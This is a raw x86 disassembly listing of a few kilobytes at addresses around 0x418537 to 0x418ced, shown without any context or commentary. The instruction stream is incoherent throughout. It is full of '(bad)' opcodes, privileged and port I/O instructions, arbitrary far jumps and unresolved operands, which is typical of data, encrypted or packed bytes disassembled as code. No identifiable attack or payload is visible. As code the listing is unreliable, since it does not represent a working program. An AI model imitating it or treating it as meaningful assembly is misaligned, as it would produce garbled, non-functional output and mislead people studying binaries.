  418537:	gs (bad) 
  418539:	jmp    0xb8d2:0x9b13f1b7
  418540:	push   esp
  418541:	xchg   esp,eax
  418542:	jns    0x4184df
  418544:	xor    edi,DWORD PTR [esp+esi*1]
  418547:	push   0xffffff93
  418549:	mov    edx,0x2922ac5a
  41854e:	ja     0x4184fd
  418550:	xchg   ebx,eax
  418551:	test   al,0xfb
  418553:	cdq    
  418554:	fist   DWORD PTR [ebx-0x4a]
  418557:	mov    fs,WORD PTR [ecx-0x2813c155]
  41855d:	imul   edi,DWORD PTR [edi],0xdb3be244
  418563:	xor    dh,BYTE PTR [eax+0x7c]
  418566:	pop    esp
  418567:	pop    edx
  418568:	pop    es
  418569:	aaa    
  41856a:	inc    edx
  41856b:	dec    edi
  41856c:	dec    edx
  41856d:	mov    al,ds:0x7dd6b6ef
  418572:	fild   QWORD PTR [eax]
  418574:	ins    DWORD PTR es:[edi],dx
  418575:	and    bh,BYTE PTR [eax+0x1b]
  418578:	jmp    0x4185d3
  41857a:	add    cl,dl
  41857c:	(bad)  
  41857d:	adc    BYTE PTR [ebx],ah
  41857f:	int3   
  418580:	fwait
  418581:	mov    al,ds:0x6889ab3e
  418586:	test   DWORD PTR [esi+eax*4-0x79820d6e],ebp
  41858d:	loopne 0x41853b
  41858f:	dec    edi
  418590:	rol    DWORD PTR [ecx+0x6],cl
  418593:	loopne 0x4185b7
  418595:	mov    bl,0x2f
  418597:	nop
  418598:	or     BYTE PTR [ebp+0x78d03ed6],al
  41859e:	dec    ecx
  41859f:	pop    esi
  4185a0:	xor    edx,edx
  4185a2:	lods   eax,DWORD PTR ds:[esi]
  4185a3:	push   eax
  4185a4:	and    eax,0x39f71076
  4185a9:	je     0x41860e
  4185ab:	scas   al,BYTE PTR es:[edi]
  4185ac:	daa    
  4185ad:	inc    ecx
  4185ae:	fstp   DWORD PTR [ebp+0x1685074d]
  4185b4:	pop    eax
  4185b5:	mov    bh,0xdd
  4185b7:	mov    eax,ds:0x568f8fa1
  4185bc:	jnp    0x4185b0
  4185be:	ins    DWORD PTR es:[edi],dx
  4185bf:	repnz add al,ch
  4185c2:	(bad)  
  4185c3:	ficomp DWORD PTR [eax-0x3b9417b7]
  4185c9:	lock sbb al,0xf5
  4185cc:	xchg   esp,eax
  4185cd:	pop    ds
  4185ce:	popf   
  4185cf:	and    bh,cl
  4185d1:	popf   
  4185d2:	fisttp WORD PTR [esi+ebp*8+0x1d6f4e23]
  4185d9:	or     ebp,ecx
  4185db:	sti    
  4185dc:	inc    edx
  4185dd:	(bad)  
  4185de:	sub    BYTE PTR [ecx+0x355ea496],dh
  4185e4:	sbb    cl,dh
  4185e6:	bound  esi,QWORD PTR [edi+ecx*2-0x3ccdb5ce]
  4185ed:	bswap  esp
  4185ef:	sar    DWORD PTR [ebp-0x1376a80e],0xd5
  4185f6:	cmp    al,0x87
  4185f8:	and    dh,ah
  4185fa:	arpl   WORD PTR [eax-0x73],ax
  4185fd:	inc    DWORD PTR [ebx+0x74856fdb]
  418603:	ins    DWORD PTR es:[edi],dx
  418604:	fistp  WORD PTR ds:0x113429cf
  41860a:	fwait
  41860b:	push   cs
  41860c:	xchg   BYTE PTR [edx-0x76],bl
  41860f:	and    BYTE PTR [edi+0x25],bl
  418612:	pushf  
  418613:	ret    
  418614:	mov    ss,WORD PTR [eax]
  418616:	mov    eax,0x1ae00a42
  41861b:	xor    bh,BYTE PTR [edx]
  41861d:	aaa    
  41861e:	int    0xed
  418620:	(bad)  
  418621:	inc    dx
  418623:	cs pop edx
  418625:	xchg   ecx,eax
  418626:	dec    ebx
  418627:	xor    BYTE PTR [esi-0x5308cb3a],ch
  41862d:	add    al,0xaf
  41862f:	push   edx
  418630:	pop    esi
  418631:	mov    cl,0x43
  418633:	out    0x2d,eax
  418635:	cli    
  418636:	call   FWORD PTR [edx+0x6c5b276c]
  41863c:	mov    ds:0x691ef39c,al
  418641:	push   cs
  418642:	push   ebp
  418643:	test   dh,ch
  418645:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418646:	jg     0x4185f5
  418648:	loop   0x41866a
  41864a:	mov    ebx,0x9c56145a
  41864f:	sbb    BYTE PTR [edi+0x51],ch
  418652:	loope  0x4186d0
  418654:	add    eax,0x402159de
  418659:	je     0x4186ba
  41865b:	clc    
  41865c:	sub    esi,ecx
  41865e:	cli    
  41865f:	add    BYTE PTR [esi-0x34ae0bf4],ah
  418665:	dec    ebx
  418666:	ds pop ebp
  418668:	push   cs
  418669:	inc    edi
  41866a:	dec    ebp
  41866b:	add    bl,BYTE PTR [edi]
  41866d:	js     0x418660
  41866f:	lods   al,BYTE PTR ds:[esi]
  418670:	mov    esi,0x1249dddf
  418675:	gs lock jp 0x4185fd
  418679:	nop
  41867a:	sahf   
  41867b:	sub    eax,0x3bfc6f5c
  418680:	mov    DWORD PTR [edi+edi*4+0x4c6d4d21],eax
  418687:	push   eax
  418688:	xchg   ch,cl
  41868a:	jp     0x418707
  41868c:	nop
  41868d:	repnz and BYTE PTR [ecx+0x6c],al
  418691:	sbb    al,BYTE PTR [edx+0x3dd9b22a]
  418697:	clc    
  418698:	cli    
  418699:	cmp    al,0x1d
  41869b:	mov    esi,0x17a7b111
  4186a0:	pop    edx
  4186a1:	mov    ch,0xa7
  4186a3:	dec    eax
  4186a4:	pop    di
  4186a6:	mov    dl,0x51
  4186a8:	(bad)  
  4186a9:	mov    BYTE PTR [edi],cl
  4186ab:	fs jo  0x4186f3
  4186ae:	add    BYTE PTR [edi+0x59],al
  4186b1:	xlat   BYTE PTR ds:[ebx]
  4186b2:	cwde   
  4186b3:	fmul   QWORD PTR [eax+0x69]
  4186b6:	das    
  4186b7:	stc    
  4186b8:	xor    esp,ebp
  4186ba:	stos   DWORD PTR es:[edi],eax
  4186bb:	xchg   esp,eax
  4186bc:	mov    ch,0x74
  4186be:	push   eax
  4186bf:	int3   
  4186c0:	mov    ah,0xdd
  4186c2:	sub    ecx,DWORD PTR [ebp-0x45]
  4186c5:	into   
  4186c6:	cwde   
  4186c7:	sub    eax,0x96dfb9b3
  4186cc:	mov    ecx,0xca07bd33
  4186d1:	test   DWORD PTR [esi+0x548a883f],edx
  4186d7:	xor    al,0x76
  4186d9:	cs aam 0x78
  4186dc:	(bad)  
  4186de:	cmp    bl,ah
  4186e0:	pop    ds
  4186e1:	fbstp  TBYTE PTR [ebx-0x54a4fd49]
  4186e7:	test   eax,0x1f55fb5e
  4186ec:	xor    DWORD PTR [ebx-0x82a8075],0xffffffb4
  4186f3:	or     DWORD PTR ds:0x2846fbbd,0xffffffbc
  4186fa:	inc    edi
  4186fb:	inc    edx
  4186fc:	pop    eax
  4186fd:	inc    edi
  4186fe:	cmp    al,0x5
  418700:	inc    esp
  418701:	imul   edx,eax,0x30
  418704:	adc    al,0x90
  418706:	retf   0x23f7
  418709:	mov    DWORD PTR [esi-0x6fa8fd],esp
  41870f:	repz cwde 
  418711:	aaa    
  418712:	in     al,0x5c
  418714:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418715:	fldenv [eax+0x24]
  418718:	outs   dx,BYTE PTR ds:[esi]
  418719:	js     0x4186d7
  41871b:	shl    BYTE PTR [edx-0x716b0b28],cl
  418721:	pop    ss
  418722:	dec    ebp
  418723:	stos   BYTE PTR es:[edi],al
  418724:	push   ecx
  418725:	dec    ecx
  418726:	fsubr  QWORD PTR [eax+0x2831deee]
  41872c:	mov    ebx,0x5b20d233
  418731:	repnz into 
  418733:	xchg   ebp,eax
  418734:	aam    0x96
  418736:	pop    edi
  418737:	mov    ds:0xeba68683,eax
  41873c:	xor    ecx,DWORD PTR [esi+ecx*2-0x433570d6]
  418743:	lods   al,BYTE PTR ds:[esi]
  418744:	or     eax,0xfd789df2
  418749:	pop    ss
  41874a:	mov    DWORD PTR [edx+0x4b158b2f],ecx
  418750:	jp     0x41875a
  418752:	shl    BYTE PTR [edi+edx*4+0x42],0x9c
  418757:	adc    BYTE PTR [ebx],dl
  418759:	in     al,dx
  41875a:	mov    edi,0x2e6eff20
  41875f:	push   cs
  418760:	mov    al,0xf5
  418762:	not    BYTE PTR [ecx+0x7af5ae6a]
  418768:	cli    
  418769:	pop    ebp
  41876a:	mov    esp,0xf0b3d8f1
  41876f:	repz (bad) 
  418772:	jmp    0xc907:0xf64bb61b
  418779:	and    BYTE PTR [ebx+0x2a],cl
  41877c:	test   eax,0x5d185daa
  418781:	cli    
  418782:	dec    ecx
  418783:	pop    edi
  418784:	mov    WORD PTR [ebx-0x45],ds
  418787:	xor    cl,bh
  418789:	cli    
  41878a:	int3   
  41878b:	and    dh,cl
  41878d:	xchg   BYTE PTR [edi],dl
  41878f:	push   ecx
  418790:	xchg   esi,eax
  418791:	xchg   esi,eax
  418792:	mov    edi,0x372b0dc9
  418797:	imul   edi,DWORD PTR [edi],0x2f
  41879a:	addr16 pop ds
  41879c:	pop    ebx
  41879d:	mov    WORD PTR [edi],?
  41879f:	mov    dl,0x49
  4187a1:	pop    eax
  4187a2:	das    
  4187a3:	mov    eax,0x63c65170
  4187a8:	in     eax,0x16
  4187aa:	xchg   ebx,ebp
  4187ac:	and    bh,BYTE PTR [ebx+0x362e28a6]
  4187b2:	xor    eax,0xfa229ce9
  4187b7:	push   edx
  4187b8:	pop    eax
  4187b9:	inc    esp
  4187ba:	adc    DWORD PTR [ebp-0x31403d5d],ebp
  4187c0:	or     bh,al
  4187c2:	pusha  
  4187c3:	sub    edi,DWORD PTR [ebp+0x65]
  4187c6:	push   esi
  4187c7:	sub    cl,BYTE PTR [esi]
  4187c9:	add    BYTE PTR [esi+0x30],bh
  4187cc:	ds adc al,0xf2
  4187cf:	dec    edx
  4187d0:	lods   eax,DWORD PTR ds:[esi]
  4187d1:	sbb    eax,0x8331332c
  4187d6:	fs add al,0x3e
  4187d9:	and    ebp,DWORD PTR [edx+0xc3d9c6b]
  4187df:	ins    BYTE PTR es:[edi],dx
  4187e0:	pop    edx
  4187e1:	retf   
  4187e2:	xor    BYTE PTR [ebx+eiz*2+0x55bfae6c],ah
  4187e9:	push   es
  4187ea:	inc    ecx
  4187eb:	add    DWORD PTR [ecx],eax
  4187ed:	jne    0x41882a
  4187ef:	lods   eax,DWORD PTR ds:[esi]
  4187f0:	ins    DWORD PTR es:[edi],dx
  4187f1:	iret   
  4187f2:	jae    0x418837
  4187f4:	add    esi,DWORD PTR [eax]
  4187f6:	jnp    0x41880b
  4187f8:	cs js  0x4187b7
  4187fb:	das    
  4187fc:	lds    ecx,FWORD PTR [ebp-0x2ecc6109]
  418802:	push   es
  418803:	xlat   BYTE PTR ds:[ebx]
  418804:	(bad)  
  418805:	cmp    DWORD PTR [ebx+0x2],ebx
  418808:	or     dh,BYTE PTR [ebx-0x4c]
  41880b:	(bad)  
  41880c:	jmp    0x4245:0xa1e4b26b
  418813:	shr    BYTE PTR [esi+0x19],cl
  418816:	xor    BYTE PTR [edi+0x72],al
  418819:	mov    bh,0x88
  41881b:	push   eax
  41881c:	ss dec edx
  41881e:	or     al,0xda
  418820:	out    dx,al
  418821:	adc    BYTE PTR [eax],bl
  418823:	sbb    BYTE PTR [eax-0x49b78a9b],bh
  418829:	inc    esp
  41882a:	fwait
  41882b:	dec    eax
  41882c:	dec    ebx
  41882d:	xor    ebx,DWORD PTR [edi-0x69]
  418830:	sahf   
  418831:	cmc    
  418832:	adc    BYTE PTR [ebx],bh
  418834:	outs   dx,DWORD PTR ds:[esi]
  418835:	jge    0x418804
  418837:	inc    DWORD PTR [ecx]
  418839:	shr    BYTE PTR [ebp+0x30],1
  41883c:	inc    esp
  41883d:	popf   
  41883e:	dec    eax
  41883f:	cmp    DWORD PTR [ebp+0x23],ebx
  418842:	or     BYTE PTR [ebx+eax*8+0x4d],ah
  418846:	xor    eax,0xceecac1f
  41884b:	sti    
  41884c:	dec    DWORD PTR [ebx]
  41884e:	lea    ebx,ds:0x983796f1
  418854:	inc    edi
  418855:	adc    DWORD PTR [eax-0x2a45e03c],ebp
  41885b:	dec    edi
  41885c:	dec    edx
  41885d:	out    dx,eax
  41885e:	lds    eax,FWORD PTR [ebp-0x28919a08]
  418864:	pop    ss
  418865:	mov    ah,0x47
  418867:	in     eax,dx
  418868:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418869:	fist   DWORD PTR [ecx+0x6a]
  41886c:	fbstp  TBYTE PTR gs:[esi+0x50]
  418870:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418871:	es sub eax,0x231a97db
  418877:	out    0x1a,al
  418879:	and    BYTE PTR [ebp-0x2b6dcf8b],ch
  41887f:	sub    eax,0x23b18a89
  418884:	data16 mov BYTE PTR [ecx-0x2a678039],bl
  41888b:	jl     0x4188f4
  41888d:	ror    DWORD PTR [edi+0x45f32522],cl
  418893:	mov    BYTE PTR [edi-0x40],ch
  418896:	add    ebp,ecx
  418898:	xlat   BYTE PTR ds:[ebx]
  418899:	fwait
  41889a:	or     ebp,esi
  41889c:	pop    ss
  41889d:	jno    0x4188b8
  41889f:	pop    edx
  4188a0:	mov    dh,0x81
  4188a2:	lock add eax,0xde54d245
  4188a8:	inc    ebx
  4188a9:	and    BYTE PTR [esi-0x74],cl
  4188ac:	mov    ebx,0x768dbf24
  4188b1:	sbb    bh,BYTE PTR [edi]
  4188b3:	mov    bh,0xe9
  4188b5:	fisubr WORD PTR [esi+0x7108f741]
  4188bb:	das    
  4188bc:	inc    ebx
  4188bd:	and    eax,0x1382ae9b
  4188c2:	aas    
  4188c3:	pop    esi
  4188c4:	mov    ah,0x8a
  4188c6:	cmp    DWORD PTR [ebx-0x35],esp
  4188c9:	sbb    DWORD PTR [ecx-0xb81155b],esi
  4188cf:	push   edi
  4188d0:	push   eax
  4188d1:	shl    BYTE PTR [eax-0x69cfe14c],cl
  4188d7:	in     eax,dx
  4188d8:	idiv   BYTE PTR [edi]
  4188da:	test   DWORD PTR [ecx*4+0x36f99823],ebp
  4188e1:	sub    esp,esi
  4188e3:	std    
  4188e4:	mov    eax,ds:0xb8e7e650
  4188e9:	xor    BYTE PTR [ebp-0x80],al
  4188ec:	scas   al,BYTE PTR es:[edi]
  4188ed:	jg     0x4188c6
  4188ef:	dec    edi
  4188f0:	sbb    DWORD PTR [ecx-0x32a0ec28],edi
  4188f6:	sbb    eax,0xb62ed371
  4188fb:	inc    ebx
  4188fc:	inc    eax
  4188fd:	dec    edx
  4188fe:	xchg   edx,eax
  4188ff:	dec    edi
  418900:	daa    
  418901:	scas   eax,DWORD PTR es:[edi]
  418902:	mov    ebx,0xdd1c2d5b
  418907:	mov    edi,0xf5e04d73
  41890c:	adc    BYTE PTR [edi-0x325b097e],bh
  418912:	pop    es
  418913:	sti    
  418914:	mov    ah,0xe0
  418916:	sub    eax,DWORD PTR [esi]
  418918:	dec    eax
  418919:	aaa    
  41891a:	inc    ecx
  41891b:	jp     0x4188a8
  41891d:	xlat   BYTE PTR gs:[ebx]
  41891f:	rcl    DWORD PTR [ebx*1+0x698af505],1
  418926:	xchg   ebx,eax
  418927:	xchg   edi,eax
  418928:	sbb    ebp,eax
  41892a:	into   
  41892b:	adc    eax,ecx
  41892d:	test   eax,0x400a0f4c
  418932:	imul   esi,edx,0x57ce76c8
  418938:	aam    0x32
  41893a:	inc    edx
  41893b:	xchg   ebx,eax
  41893c:	or     BYTE PTR [eax-0xe4f851c],ch
  418942:	out    dx,al
  418943:	inc    ebp
  418944:	test   BYTE PTR [esi+0x3],cl
  418947:	lahf   
  418948:	pop    es
  418949:	push   ebp
  41894a:	shr    BYTE PTR [ecx-0x53],1
  41894d:	lahf   
  41894e:	mov    WORD PTR [ebx-0x1e],?
  418951:	daa    
  418952:	and    eax,0xb845b29e
  418957:	adc    al,0x76
  418959:	inc    DWORD PTR [esi]
  41895b:	xchg   ecx,eax
  41895c:	test   al,0x50
  41895e:	daa    
  41895f:	nop
  418960:	pop    ebx
  418961:	xchg   ecx,eax
  418962:	pushf  
  418963:	into   
  418964:	push   ebx
  418965:	in     eax,dx
  418966:	add    BYTE PTR [esp+ebx*1+0x758ac3f1],bl
  41896d:	nop
  41896e:	lods   eax,DWORD PTR ds:[esi]
  41896f:	adc    eax,0xeb0611ca
  418974:	test   BYTE PTR [edx-0x12],dl
  418977:	aam    0xf5
  418979:	or     al,0x37
  41897b:	jge    0x41899b
  41897d:	test   al,0xc7
  41897f:	std    
  418980:	mov    ebx,0x95ce9e2e
  418985:	out    0xfa,al
  418987:	rcl    esp,0xf
  41898a:	mov    al,ds:0xc590a044
  41898f:	cmp    edi,ebp
  418991:	jbe    0x418a0b
  418993:	aaa    
  418994:	pop    esp
  418995:	pop    eax
  418996:	mov    ebx,0x2155ce0f
  41899b:	je     0x41898f
  41899d:	mov    dl,0x3c
  41899f:	(bad)  
  4189a0:	hlt    
  4189a1:	int3   
  4189a2:	pop    ss
  4189a3:	push   cs
  4189a4:	popf   
  4189a5:	cmc    
  4189a6:	data16 clc 
  4189a8:	dec    esi
  4189a9:	lock pop ecx
  4189ab:	xlat   BYTE PTR ds:[ebx]
  4189ac:	ins    DWORD PTR es:[edi],dx
  4189ad:	or     BYTE PTR [edx-0x108d0f0],al
  4189b3:	mov    edi,0x4980d580
  4189b8:	jmp    0xab76:0xbde9fe46
  4189bf:	jae    0x4189c1
  4189c1:	jle    0x41896d
  4189c3:	imul   BYTE PTR [ecx+0x6]
  4189c6:	and    eax,0xc6cd32d1
  4189cb:	sub    cl,ah
  4189cd:	jp     0x4189ae
  4189cf:	(bad)  
  4189d0:	psrld  mm4,QWORD PTR [edi]
  4189d3:	rcr    DWORD PTR [esi+0x2c1611c6],cl
  4189d9:	loopne 0x4189a9
  4189db:	nop
  4189dc:	dec    ebx
  4189dd:	xchg   edi,eax
  4189de:	aad    0x19
  4189e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4189e1:	xor    eax,0x4049a856
  4189e6:	ja     0x418a41
  4189e8:	mov    edx,0xcfd13711
  4189ed:	dec    edi
  4189ee:	pop    ds
  4189ef:	mov    ds:0xa480e153,al
  4189f4:	stos   BYTE PTR es:[edi],al
  4189f5:	in     al,0x29
  4189f7:	cli    
  4189f8:	inc    esi
  4189f9:	cmp    al,0x29
  4189fb:	xchg   ebp,eax
  4189fc:	lahf   
  4189fd:	cmp    eax,0x625e9e4
  418a02:	inc    edx
  418a03:	or     DWORD PTR [eax],0xd5d61dfa
  418a09:	and    al,0x54
  418a0b:	push   edx
  418a0c:	clc    
  418a0d:	pushf  
  418a0e:	hlt    
  418a0f:	mov    eax,0xa8d5f50
  418a14:	cmp    cl,dh
  418a16:	push   ebp
  418a17:	xchg   DWORD PTR [ebx+0x34],edi
  418a1a:	push   edx
  418a1b:	xor    ah,BYTE PTR [ecx+0x54]
  418a1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a1f:	cli    
  418a20:	retf   
  418a21:	adc    esp,DWORD PTR [eax-0x45]
  418a24:	fadd   DWORD PTR [ebx-0x38a27bb1]
  418a2a:	jmp    0xa713dbcc
  418a2f:	ror    BYTE PTR [edx],1
  418a31:	mov    ds:0x19fdfb0c,al
  418a36:	in     eax,0xf5
  418a38:	push   0x46
  418a3a:	leave  
  418a3b:	sub    eax,0xa3ee8d53
  418a40:	inc    esi
  418a41:	jl     0x418a24
  418a43:	js     0x418ac2
  418a45:	xlat   BYTE PTR ds:[ebx]
  418a46:	ret    
  418a47:	(bad)  
  418a48:	adc    eax,0xe9690bc2
  418a4d:	bound  ebp,QWORD PTR [ebx+esi*1-0x7b]
  418a51:	dec    ecx
  418a52:	jle    0x418aa6
  418a54:	scas   al,BYTE PTR es:[edi]
  418a55:	div    DWORD PTR [ebx]
  418a57:	sub    al,0xe
  418a59:	push   esi
  418a5a:	int    0xa
  418a5c:	xlat   BYTE PTR ds:[ebx]
  418a5d:	hlt    
  418a5e:	ror    BYTE PTR [esi-0x7034d2af],cl
  418a64:	add    DWORD PTR [ebx],edi
  418a66:	mov    ebx,0xc49dd200
  418a6b:	jae    0x418a25
  418a6d:	clc    
  418a6e:	rcr    BYTE PTR [edx+ecx*1],cl
  418a71:	sbb    ebp,DWORD PTR [ebx]
  418a73:	mov    ah,0xb7
  418a75:	xor    BYTE PTR es:[ecx-0x42e21b8e],0x8e
  418a7d:	mov    ah,0x44
  418a7f:	cld    
  418a80:	fucomip st,st(5)
  418a82:	pop    es
  418a83:	loope  0x418a3e
  418a85:	xlat   BYTE PTR ds:[ebx]
  418a86:	cmp    ch,bl
  418a88:	or     BYTE PTR [ecx+0x5de3f510],ch
  418a8e:	adc    al,0xd3
  418a90:	fnstsw WORD PTR [ebp-0x703613ff]
  418a96:	stc    
  418a97:	inc    edi
  418a98:	sbb    eax,DWORD PTR [ebx-0x1d]
  418a9b:	call   0x634a:0xea409350
  418aa2:	add    bl,BYTE PTR [edx]
  418aa4:	mov    ecx,0x49fe2b55
  418aa9:	add    al,0x89
  418aab:	add    al,0x3f
  418aad:	xchg   esi,eax
  418aae:	dec    esp
  418aaf:	fsubr  DWORD PTR ds:0xfa34442a
  418ab5:	cdq    
  418ab6:	rol    dh,1
  418ab8:	inc    ebp
  418ab9:	sub    eax,0x7481e0e8
  418abe:	add    eax,0x629051de
  418ac3:	pop    ebp
  418ac4:	jae    0x418b2a
  418ac6:	loope  0x418b0e
  418ac8:	mov    cl,BYTE PTR [ebp-0x34738bfd]
  418ace:	shr    DWORD PTR [edi],1
  418ad0:	xor    eax,0xddf4f2cb
  418ad5:	mov    bl,cl
  418ad7:	mov    ds:0xcc6b76c9,al
  418adc:	sbb    al,BYTE PTR [ebx-0x2b]
  418adf:	cmp    eax,0x5f080e5b
  418ae4:	or     BYTE PTR [ebx-0x3671607e],ah
  418aea:	xor    al,0x4d
  418aec:	jb     0x418afd
  418aee:	pusha  
  418aef:	arpl   WORD PTR [esi],cx
  418af1:	iret   
  418af2:	inc    esp
  418af3:	xchg   edi,eax
  418af4:	out    dx,al
  418af5:	sub    eax,0x2653be3e
  418afa:	enter  0x4583,0x68
  418afe:	in     eax,dx
  418aff:	jo     0x418aff
  418b01:	push   edx
  418b02:	jo     0x418b60
  418b04:	test   edx,0x7f2b8170
  418b0a:	stos   BYTE PTR es:[edi],al
  418b0b:	dec    edx
  418b0c:	imul   edi,DWORD PTR [edx],0xae056227
  418b12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b13:	pop    ebx
  418b14:	sbb    bl,BYTE PTR [edx]
  418b16:	add    al,0x4f
  418b18:	jecxz  0x418b16
  418b1a:	and    DWORD PTR [ebx-0x53],ecx
  418b1d:	jnp    0x418b07
  418b1f:	inc    edi
  418b20:	dec    esp
  418b21:	retf   
  418b22:	popf   
  418b23:	ret    
  418b24:	and    al,0x17
  418b26:	psubb  mm1,mm5
  418b29:	mov    ebp,0xfae71064
  418b2e:	(bad)  
  418b2f:	in     eax,dx
  418b30:	cli    
  418b31:	mov    bh,0x64
  418b33:	push   ds
  418b34:	ins    BYTE PTR es:[edi],dx
  418b35:	jle    0x418aec
  418b37:	(bad)  
  418b38:	mov    eax,0x7ac5acbe
  418b3d:	fnstenv [edi+0x187939ad]
  418b43:	jo     0x418b52
  418b45:	out    dx,eax
  418b46:	mov    ds:0x76b629d4,al
  418b4b:	dec    ebx
  418b4c:	xchg   edx,eax
  418b4d:	push   edx
  418b4e:	fcmovne st,st(6)
  418b50:	fsubr  QWORD PTR [edi+ecx*4+0x508083b2]
  418b57:	mov    ebx,ss
  418b59:	cmp    BYTE PTR [edx-0x7e7c3a3f],cl
  418b5f:	mov    cl,0x63
  418b61:	in     eax,0x5f
  418b63:	xor    al,0xfe
  418b65:	sbb    eax,0xb95ac8eb
  418b6a:	or     al,0x6d
  418b6c:	stos   BYTE PTR es:[edi],al
  418b6d:	dec    eax
  418b6e:	or     DWORD PTR [esi],edx
  418b70:	mov    ds:0xba4fbbb9,eax
  418b75:	or     ebx,DWORD PTR [ebp-0x57]
  418b78:	xor    al,0x8
  418b7a:	and    BYTE PTR [eax-0x17e62664],bl
  418b80:	fild   QWORD PTR [esi+0x2ad4168]
  418b86:	je     0x418bc0
  418b88:	scas   al,BYTE PTR es:[edi]
  418b89:	push   es
  418b8a:	icebp  
  418b8b:	push   0xf0b199f4
  418b90:	stos   DWORD PTR es:[edi],eax
  418b91:	pop    edx
  418b92:	adc    eax,0xf8e5594f
  418b97:	xor    ebx,DWORD PTR [ecx-0x74309172]
  418b9d:	mov    DWORD PTR [ebx-0x62d2799],edi
  418ba3:	dec    ebp
  418ba4:	mov    al,0x29
  418ba6:	mov    bh,0x29
  418ba8:	repz mov edi,0x408486da
  418bae:	clc    
  418baf:	in     eax,dx
  418bb0:	push   ebx
  418bb1:	jno    0x418b90
  418bb3:	and    DWORD PTR [ebp+0xc],esi
  418bb6:	mov    eax,0xca9f3396
  418bbb:	enter  0xf7ca,0xd2
  418bbf:	jge    0x418c14
  418bc1:	mov    dh,0xee
  418bc3:	xchg   edx,eax
  418bc4:	dec    ecx
  418bc5:	xchg   edx,eax
  418bc6:	jge    0x418c08
  418bc8:	add    BYTE PTR [edi],bh
  418bca:	mov    ds:0xbf454b37,eax
  418bcf:	scas   eax,DWORD PTR es:[edi]
  418bd0:	les    ecx,FWORD PTR [ecx]
  418bd2:	or     eax,0x8d2bddd7
  418bd7:	icebp  
  418bd8:	xchg   edi,eax
  418bd9:	mov    esi,0xf81b1862
  418bde:	lods   eax,DWORD PTR fs:[esi]
  418be0:	sbb    DWORD PTR [esi+0x70],0x7b
  418be4:	inc    ebx
  418be5:	in     al,0xf9
  418be7:	imul   esi,edx,0xffffffe5
  418bea:	in     eax,0xc2
  418bec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418bed:	sub    ebp,DWORD PTR [esi+0x61]
  418bf0:	sub    ah,bl
  418bf2:	test   BYTE PTR [ecx],bh
  418bf4:	mov    ebp,DWORD PTR fs:[edx+0x322affee]
  418bfb:	sahf   
  418bfc:	int    0xcb
  418bfe:	cmp    al,0x3c
  418c00:	into   
  418c01:	and    bl,BYTE PTR [ecx+0xb]
  418c04:	mov    al,ds:0xd8e21d25
  418c09:	jns    0x418c0e
  418c0b:	xor    BYTE PTR [ebx-0x17],0x11
  418c0f:	or     edx,DWORD PTR [edx-0x43086a1f]
  418c15:	jl     0x418bea
  418c17:	jb     0x418bcc
  418c19:	mov    cl,0x94
  418c1b:	mov    esi,0x7277789e
  418c20:	(bad)  
  418c21:	or     DWORD PTR [edi+0x12a223f3],ebx
  418c27:	scas   eax,DWORD PTR es:[edi]
  418c28:	(bad)  
  418c29:	and    edx,DWORD PTR [eax]
  418c2b:	add    eax,0x13c61c27
  418c30:	mov    dh,0x7
  418c32:	js     0x418c31
  418c34:	icebp  
  418c35:	sub    DWORD PTR [ebp+0x23],esp
  418c38:	call   0xa32c:0x1e890915
  418c3f:	xchg   esp,eax
  418c40:	xor    eax,0x5d832b1a
  418c45:	jmp    FWORD PTR ds:0x96ac303d
  418c4b:	sub    cl,BYTE PTR [edi+0x5c5bdbaf]
  418c51:	mov    BYTE PTR [edi+0x20e5aca2],bl
  418c57:	xchg   ebp,eax
  418c58:	sub    al,0xa7
  418c5a:	cwde   
  418c5b:	lahf   
  418c5c:	add    dl,dl
  418c5e:	repnz shl DWORD PTR [ecx],cl
  418c61:	adc    al,0xdf
  418c63:	rcr    BYTE PTR fs:[eax],0xc9
  418c67:	pop    es
  418c68:	sub    al,0x9e
  418c6a:	jmp    0x7bdaf2b7
  418c6f:	lds    ebp,FWORD PTR [edx]
  418c71:	push   ss
  418c72:	cs clc 
  418c74:	pop    ecx
  418c75:	inc    eax
  418c76:	inc    edx
  418c77:	adc    esp,DWORD PTR [esi]
  418c79:	popa   
  418c7a:	sub    al,BYTE PTR [esi-0x487173e6]
  418c80:	jmp    0x418c88
  418c82:	data16 in al,dx
  418c84:	(bad)  
  418c85:	pop    edi
  418c86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c87:	xchg   esi,eax
  418c88:	inc    esi
  418c89:	fisttp WORD PTR [esi]
  418c8b:	adc    BYTE PTR [edx+0x46],0x27
  418c8f:	add    cl,BYTE PTR [ecx]
  418c91:	addr16 popf 
  418c93:	inc    edi
  418c94:	ret    0x9f6d
  418c97:	adc    DWORD PTR [ebp+0x6a],ebx
  418c9a:	(bad)  
  418c9b:	and    al,al
  418c9d:	std    
  418c9e:	std    
  418c9f:	adc    al,0x3d
  418ca1:	retf   0x4c73
  418ca4:	sub    DWORD PTR [eax],esi
  418ca6:	(bad)  
  418ca7:	int3   
  418ca8:	mov    ebx,0xc99a99a6
  418cad:	xchg   edx,eax
  418cae:	pop    eax
  418caf:	mov    ds:0xfbef4161,eax
  418cb4:	and    eax,0xa6520c00
  418cb9:	xor    ebp,eax
  418cbb:	or     BYTE PTR [ebp-0x5421960a],ch
  418cc1:	lods   al,BYTE PTR ds:[esi]
  418cc2:	bound  ebx,QWORD PTR [esi-0x18]
  418cc5:	cmp    ch,dl
  418cc7:	mov    ecx,0x31030d4f
  418ccc:	popa   
  418ccd:	pop    edi
  418cce:	jle    0x418c9c
  418cd0:	cmp    esi,DWORD PTR [edi-0x2]
  418cd3:	inc    ebx
  418cd4:	inc    ebp
  418cd5:	inc    edx
  418cd6:	pop    ebp
  418cd7:	fidiv  WORD PTR [ecx-0x5d]
  418cda:	inc    ebp
  418cdb:	xor    eax,0x1f55eca7
  418ce0:	mov    ebp,DWORD PTR [esi+0x77d93ef0]
  418ce6:	pop    eax
  418ce7:	jmp    0x418c84
  418ce9:	mov    ebp,ebp
  418ceb:	mov    cl,0x71
  418ced:	shl    DWORD PTR [eax+eax*2],0xc1
